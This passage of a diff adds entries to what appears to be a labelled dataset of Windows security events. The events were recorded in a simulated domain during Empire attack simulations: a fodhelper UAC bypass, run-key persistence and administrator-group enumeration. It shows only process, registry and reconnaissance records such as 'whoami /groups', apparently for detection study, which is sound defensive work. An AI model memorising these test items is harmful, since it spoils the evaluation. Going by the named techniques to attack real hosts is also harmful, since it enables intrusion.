+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\Windows\System32\lsass.exe | net=172.18.39.5->172.18.38.5:135
+
+## day2-035  (source: empire_shell_net_localgroup_administrators.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\System32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime | reg_value=QWORD (0x01d6906d-0x9636774b)
+
+## day2-036  (source: empire_uac_shellapi_fodhelper.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\Windows\System32\RuntimeBroker.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Notifications\Data\418A073AA3BC3475 | reg_value=Binary Data
+
+## day2-037  (source: empire_uac_shellapi_fodhelper.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\System32\svchost.exe | reg_key=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\VFUProvider\StartTime | reg_value=QWORD (0x01d6828d-0x325043e2)
+
+## day2-038  (source: empire_uac_shellapi_fodhelper.zip)
+host=WORKSTATION5.theshire.local | user=THESHIRE\pgustavo | image=C:\Windows\System32\whoami.exe | cmd='"C:\\windows\\system32\\whoami.exe" /groups'
+
+## day2-039  (source: empire_persistence_registry_modification_run_keys_standard_user.zip)
+host=WORKSTATION5.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\windows\system32\lsass.exe | reg_key=HKLM\System\CurrentControlSet\Services\W32Time\SecureTimeLimits\SecureTimeHigh | reg_value=QWORD (0x01d68292-0x4749ce2f)
+
+## day2-040  (source: empire_persistence_registry_modification_run_keys_standard_user.zip)
+host=MORDORDC.theshire.local | user=NT AUTHORITY\SYSTEM | image=C:\Windows\System32\wbem\WmiPrvSE.exe | cmd='C:\\windows\\system32\\wbem\\wmiprvse.exe -Embedding'
